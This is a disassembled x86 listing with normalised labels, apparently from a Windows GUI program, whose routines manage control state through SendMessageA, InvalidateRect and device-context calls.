je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
mov al 0x1
pop ebx
retn
sub_441348
push ebx
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov edx ecx
mov eax [ eax + 0x20c ]
call sub_425318
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop ebx
retn
sub_441388
push ebx
mov ebx eax
cmp dl [ ebx + 0x214 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x214 ] dl
mov eax ebx
call sub_45c684
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x214 ]
push eax
push 0x409
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_4413c4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
lea eax [ ebp - 0x1 ]
call sub_4527d8
mov edx ebx
mov ecx 0x1
mov eax r-xdata
call sub_404524
dec al
jne r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx ebx
mov ecx 0x1
mov eax r-xdata
call sub_404524
jmp r-xdata
sub_44142c
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_4033e8
push eax
lea edx [ ebx + 0x210 ]
xor ecx ecx
mov eax ebx
call sub_4413c4
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x210 ]
call sub_40443c
push eax
mov eax ebx
call sub_456090
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0xff
push eax
push 0x401
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_441490
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x210 ]
mov edx esi
call sub_404388
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x210 ]
mov edx esi
call sub_403fd0
mov eax ebx
call sub_44142c
sub_4414bc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_45b6c4
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x214 ] 0x0
jne r-xdata
mov eax ebx
call sub_44142c
mov eax [ ebx + 0x208 ]
call sub_419b1c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_4418c4
jmp r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_4410dc
call sub_440f7c
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_4410dc
cmp [ eax + 0x17 ] 0x0
je r-xdata
sub_441534
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45c684
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419b1c
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_455450
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_4410dc
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419b1c
mov ebx eax
sub ebx 0x2
test ebx ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_441070
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44168e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419b1c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419b1c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_4410dc
mov eax [ eax + 0x10 ]
sub [ ebp - 0xc ] eax
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441695
mov eax [ ebp - 0x10 ]
call sub_4031ec
retn
inc ebx
xor esi esi
mov eax [ ebp - 0x10 ]
call sub_4410d0
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_4410dc
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419b1c
mov edx eax
sub edx esi
dec edx
mov eax [ ebp - 0x10 ]
call sub_4410dc
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_4410dc
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_441695
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419b1c
dec eax
jle r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4418c4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_419b1c
mov edx eax
dec edx
mov eax ebx
call sub_4410dc
mov edx [ ebp - 0x8 ]
call sub_441060
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_4410dc
mov edx [ ebp - 0xc ]
call sub_441060
sub_44170c
push ebx
mov ebx eax
cmp [ ebx + 0x217 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax ebx
call sub_455b40
mov edx 0xff000012
mov eax [ ebx + 0x68 ]
call sub_4247a8
sub_44173c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44189c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45c684
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4418a3
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
mov edx ebx
mov eax [ esi + 0x208 ]
call sub_4410dc
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
cmp [ ebx + 0x19 ] 0x0
je r-xdata
mov [ ebx + 0x19 ] 0x1
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4197bc
push eax
push 0x40a
mov eax esi
call sub_45c380
push eax
call SendMessageA
push 0xffffffff
lea eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_45c380
push eax
call InvalidateRect
jmp r-xdata
mov [ ebx + 0x19 ] 0x0
xor edi edi
mov al [ ebx + 0x15 ]
sub al 0x1
jb r-xdata
mov edi 0x100
jmp r-xdata
dec al
je r-xdata
mov eax ebx
call sub_440fb4
test al al
je r-xdata
mov edi 0x200
jmp r-xdata
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
or edi 0x400
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0xc ]
call sub_404014
mov eax ebx
call sub_440fcc
test al al
je r-xdata
or edi 0x1000
mov al [ ebx + 0x14 ]
dec al
je r-xdata
mov eax ebx
call sub_440fcc
push eax
lea edx [ ebp - 0x8 ]
mov cl [ ebx + 0x14 ]
mov eax esi
call sub_4413c4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax r-xdata
call sub_404524
dec al
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40443c
push eax
mov eax ebx
call sub_4197bc
or edi eax
push edi
push 0x401
mov eax esi
call sub_45c380
push eax
call SendMessageA
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax r-xdata
call sub_404524
jmp r-xdata
sub_4418c4
push ebx
push esi
push edi
push ebp
add esp 0xfffffdf4
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_45c684
test al al
je r-xdata
add esp 0x20c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x208 ]
call sub_419b1c
mov [ esp + 0x4 ] eax
test bl bl
je r-xdata
mov ebp [ esp + 0x4 ]
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp + 0x4 ] 0x80
jle r-xdata
inc ebp
xor edi edi
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] 0x80
mov cl [ esp ]
mov edx edi
mov eax esi
call sub_44173c
inc edi
dec ebp
jne r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov ebp [ esp + 0x4 ]
sub ebp 0x2
test ebp ebp
jl r-xdata
mov [ esp + 0xc ] 0xffffffff
lea eax [ esp + 0xc ]
push eax
push 0x1
push 0x404
mov eax esi
call sub_45c380
push eax
call SendMessageA
push sub_4419d8
push 0x0
push 0x401
mov eax esi
call sub_45c380
push eax
call SendMessageA
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ esp + eax * 4 + 0x8 ] 0xffffffff
lea eax [ esp + 0xc ]
push eax
mov eax [ esp + 0x8 ]
push eax
push 0x404
mov eax esi
call sub_45c380
push eax
call SendMessageA
inc ebp
xor edi edi
lea ebx [ esp + 0xc ]
mov edx edi
mov eax [ esi + 0x208 ]
call sub_4410dc
mov eax [ eax + 0x10 ]
add [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
inc edi
add ebx 0x4
dec ebp
jne r-xdata
sub_4419d8
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_45b9e8
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_44170c
cmp eax 0x2a
jne r-xdata
pop esi
pop ebx
retn
sub_441a04
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_42538c
xor eax eax
push ebp
push sub_441afa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_4257b8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_425658
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424f74
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_425090
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4410dc
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441b01
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor edx edx
call sub_4257b8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_425630
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_441b28
push ebx
push esi
mov esi edx
mov ebx eax
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4418c4
mov edx esi
mov eax ebx
call sub_45a4d8
pop esi
pop ebx
retn
sub_441b48
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_4033e8
sub_441b88
push ebx
mov ebx eax
cmp dl [ ebx + 0x217 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x217 ] dl
test dl dl
je r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
mov eax ebx
call sub_44170c
xor edx edx
mov eax ebx
call sub_455b78
sub_441bf0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x218 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_421a0c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
test al al
jne r-xdata
cmp [ ebx + 0x214 ] 0x0
jne r-xdata
mov edx [ esi + 0x7c ]
mov eax ebx
call sub_441490
jmp r-xdata
mov eax [ ebx + 0x208 ]
call sub_419b1c
test eax eax
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_4410dc
mov edx [ esi + 0x7c ]
call sub_441038
sub_441cb5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45bd34
mov dl 0x1
mov eax ebx
call sub_441ce4
pop ebx
pop ebp
retn 0x8
sub_441ce4
push ebx
push esi
push edi
add esp 0xffffffec
mov [ esp ] dl
mov edi eax
xor ebx ebx
mov eax edi
call sub_46cc58
mov esi eax
test esi esi
je r-xdata
cmp bl [ edi + 0x216 ]
je r-xdata
mov al [ esi + 0x229 ]
sub al 0x2
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
mov [ edi + 0x216 ] bl
cmp [ esp ] 0x0
je r-xdata
lea eax [ esp + 0x1 ]
push eax
lea ecx [ esp + 0x10 ]
mov edx [ edi + 0x4c ]
mov eax [ edi + 0x48 ]
call sub_4060b4
lea edx [ esp + 0x10 ]
mov ecx esi
mov eax edi
call sub_457f2c
mov eax esi
call sub_455450
cmp eax [ esp + 0x1 ]
jne r-xdata
sub al 0x3
jne r-xdata
mov eax edi
call sub_4598e8
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_455494
cmp eax [ esp + 0x5 ]
je r-xdata
mov bl 0x1
sub_441d70
push ebx
push ecx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
mov [ esp ] eax
cmp [ ebx + 0x232 ] 0x0
je r-xdata
mov ecx [ ebx + 0x208 ]
mov dl 0x1
mov eax [ esp ]
call [ eax + 0x1c ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_441dc4
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_45a79c
call sub_44ae1c
mov ecx esp
mov dl 0x1
call sub_44b1bc
lea edx [ esp + 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0xc ]
push eax
push 0x0
call sub_44ae1c
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x8 ]
call sub_44b008
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_441e4c
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_458074
push 0x2
call GetSystemMetrics
mov edx eax
mov eax ebx
call sub_455208
push 0x14
call GetSystemMetrics
mov edx eax
mov eax ebx
call sub_45522c
mov eax [ ebx + 0x4c ]
mov edx eax
sar eax 0x1
jns r-xdata
add esp 0xfffffff0
call sub_403550
add edx eax
mov eax ebx
call sub_45522c
mov [ ebx + 0x208 ] 0x1
mov [ ebx + 0x21f ] 0x0
mov [ ebx + 0x21c ] 0x0
mov [ ebx + 0x210 ] 0x0
mov [ ebx + 0x212 ] 0x64
mov [ ebx + 0x214 ] 0x1
mov [ ebx + 0x228 ] 0x1
mov [ ebx + 0x229 ] 0x1
mov [ ebx + 0x21e ] 0x1
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
adc eax 0x0
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_441f18
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x10
call sub_440dd4
mov edx ebx
mov eax esi
call sub_4591d4
or [ ebx + 0x4 ] 0x2
cmp [ esi + 0x228 ] 0x1
jne r-xdata
or [ ebx + 0x4 ] 0x8
or [ ebx + 0x4 ] 0x4
jmp r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
or [ ebx + 0x4 ] 0x40
cmp [ esi + 0x229 ] 0x0
jne r-xdata
cmp [ esi + 0x21e ] 0x0
jne r-xdata
or [ ebx + 0x4 ] 0x20
cmp [ esi + 0x21f ] 0x0
je r-xdata
or [ ebx + 0x4 ] 0x80
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_459100
mov eax [ ebx + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
or [ ebx + 0x4 ] 0x1
sub_441fac
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov esi [ ebx + 0x48 ]
mov eax ebx
call sub_459300
mov eax [ ebx + 0x20c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_455208
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406c2c
push eax
push 0x0
push 0x465
mov eax ebx
call sub_45c380
push eax
call SendMessageA
xor edx edx
mov ax [ ebx + 0x21c ]
call sub_406c2c
push eax
push 0x0
push 0x467
mov eax ebx
call sub_45c380
push eax
call SendMessageA
mov eax esp
push eax
push 0x1
push 0x46c
mov eax ebx
call sub_45c380
push eax
call SendMessageA
mov eax [ ebx + 0x214 ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x1
push 0x46b
mov eax ebx
call sub_45c380
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
mov edx eax
mov eax ebx
call sub_4424d0
push 0x0
mov eax [ ebx + 0x20c ]
call sub_45c380
push eax
push 0x469
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_442084
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ edi + 0x4 ] 0x4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ edi + 0x6 ]
mov dx [ ebx + 0x21c ]
cmp ax dx
jle r-xdata
cmp dx ax
jle r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_4033e8
jmp r-xdata
mov ax [ edi + 0x6 ]
mov [ ebx + 0x21c ] ax
mov dl 0x1
mov eax ebx
mov si 0xffb2
call sub_4033e8
sub_4420dc
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_45a934
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_45c380
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_44210c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ edi + 0x4 ] 0x4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ edi + 0x6 ]
mov dx [ ebx + 0x21c ]
cmp ax dx
jle r-xdata
cmp dx ax
jle r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_4033e8
jmp r-xdata
mov ax [ edi + 0x6 ]
mov [ ebx + 0x21c ] ax
mov dl 0x1
mov eax ebx
mov si 0xffb2
call sub_4033e8
sub_442180
push ebx
push esi
push ecx
mov esi eax
mov [ esp ] 0x1
xor ebx ebx
mov ax [ esi + 0x218 ]
cmp ax [ esi + 0x210 ]
jge r-xdata
mov ax [ esi + 0x218 ]
cmp ax [ esi + 0x212 ]
jle r-xdata
cmp [ esi + 0x21a ] 0x0
jl r-xdata
mov ax [ esi + 0x21a ]
test ax ax
jge r-xdata
cmp [ esi + 0x21a ] 0x0
jle r-xdata
xor ebx ebx
jmp r-xdata
test ax ax
jle r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esi + 0x232 ] 0x0
je r-xdata
mov bl 0x1
cmp [ esi + 0x23a ] 0x0
je r-xdata
mov ecx esp
mov edx esi
mov eax [ esi + 0x234 ]
call [ esi + 0x230 ]
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
mov ax [ esi + 0x218 ]
push eax
push ebx
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax [ esi + 0x23c ]
call [ esi + 0x238 ]
sub_44223c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x8 ] 0xfffffd2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov dx [ esi + 0xc ]
mov bp [ esi + 0x10 ]
add dx bp
mov ecx ebp
mov eax edi
call sub_442164
xor al 0x1
neg al
sbb eax eax
mov [ ebx + 0xc ] eax
sub_442294
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x1
test edi edi
je r-xdata
xor ebx ebx
mov edx esi
mov eax edi
call sub_403150
test al al
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403178
mov edi eax
test edi edi
jne r-xdata
sub_4422c4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4424a2
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
call sub_459078
dec eax
test eax eax
jl r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4424a9
lea eax [ ebp - 0x18 ]
call sub_403f7c
retn
mov eax [ esi + 0x30 ]
cmp eax [ ebx + 0x30 ]
jne r-xdata
xor eax eax
mov [ ebx + 0x20c ] eax
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_45c380
push eax
call SendMessageA
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_45903c
cmp ebx eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_45903c
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_45903c
cmp esi [ eax + 0x20c ]
jne r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403378
test al al
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_45903c
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
jne r-xdata
mov eax esi
call sub_403134
mov edx r-xdata
call sub_442294
test al al
jne r-xdata
mov eax esi
call sub_403134
mov edx r-xdata
call sub_442294
test al al
jne r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov [ ebx + 0x20c ] esi
mov eax esi
mov edx [ rw-data ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4424d0
push 0x0
mov eax esi
call sub_45c380
push eax
push 0x469
mov eax ebx
call sub_45c380
push eax
call SendMessageA
lea edx [ ebp - 0x18 ]
movsx eax [ ebx + 0x21c ]
call sub_4081bc
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_455a7c
sub_4424d0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x40 ]
push 0x0
mov eax ebx
call sub_45c380
push eax
push 0x469
mov eax ebp
call sub_45c380
push eax
call SendMessageA
mov eax [ ebx + 0x48 ]
mov edx [ ebx + 0x40 ]
mov ecx esi
sub ecx eax
mov eax ecx
mov ebp edx
sub ebp edi
lea edx [ eax + esi ]
mov eax ebx
call sub_455208
mov edx edi
sub edx ebp
mov eax ebx
call sub_4551bc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_442524
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_454f1c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x20c ]
jne r-xdata
mov eax edi
call sub_45c684
test al al
je r-xdata
push 0x0
push 0x0
push 0x469
mov eax edi
call sub_45c380
push eax
call SendMessageA
xor eax eax
mov [ edi + 0x20c ] eax
sub_442574
push ebx
mov ebx eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov ax [ ebx + 0x21c ]
pop ebx
retn
push 0x0
push 0x0
push 0x468
mov eax ebx
call sub_45c380
push eax
call SendMessageA
mov [ ebx + 0x21c ] ax
pop ebx
retn
sub_4425ac
push ebx
mov ebx eax
cmp dx [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dx
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406c2c
push eax
push 0x0
push 0x465
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_4425f4
push ebx
mov ebx eax
cmp dx [ ebx + 0x212 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x212 ] dx
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406c2c
push eax
push 0x0
push 0x465
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_44263c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x214 ]
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax esp
push eax
push 0x1
push 0x46c
mov eax ebx
call sub_45c380
push eax
call SendMessageA
mov [ esp + 0x4 ] esi
mov eax esp
push eax
push 0x1
push 0x46b
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_442698
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442764
push [ fs : eax ]
mov [ fs : eax ] esp
mov di [ ebx + 0x21c ]
cmp si di
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44276b
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov [ ebx + 0x21c ] si
test [ ebx + 0x1c ] 0x10
je r-xdata
mov ecx esi
sub cx di
mov edx esi
mov eax ebx
call sub_442164
test al al
je r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
xor edx edx
mov ax [ ebx + 0x21c ]
call sub_406c2c
push eax
push 0x0
push 0x467
mov eax ebx
call sub_45c380
push eax
call SendMessageA
mov esi [ ebx + 0x20c ]
mov eax esi
mov edx [ rw-data ]
call sub_403378
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x21c ]
call sub_4081bc
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_455a7c
sub_442774
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x229 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x229 ] dl
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax ebx
call sub_4598e8
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_4427e8
push ebx
mov ebx eax
cmp dl [ ebx + 0x228 ]
je r-xdata
pop ebx
retn
